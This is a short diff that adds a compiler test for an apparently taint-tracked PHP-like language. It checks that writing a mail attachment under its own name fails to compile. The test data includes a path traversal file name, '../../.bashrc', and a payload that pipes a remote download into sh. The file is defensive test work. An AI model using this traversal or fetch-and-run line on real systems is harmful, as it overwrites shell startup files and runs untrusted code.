@@ -1,0 +1,13 @@
+<?nvs
+// Attack: a program saves an attachment under its own file name, and the name is `../../.bashrc`.
+// `name()` returns a tainted string, so this program should not compile.
+// hostile: expect-refusal
+
+use Core\IO;
+use Core\Mail\Attachment;
+
+// 1. The file name climbs out of the folder with `..`. A file path cannot be tainted, so the write does not compile.
+Attachment $upload = Attachment::fromBytes('../../.bashrc', "curl https://example.com/x | sh\n");
+string $folder = IO::createTemporaryDirectory();
+IO::write($folder . '/' . $upload->name(), $upload->bytes());
+echo "1 written\n";
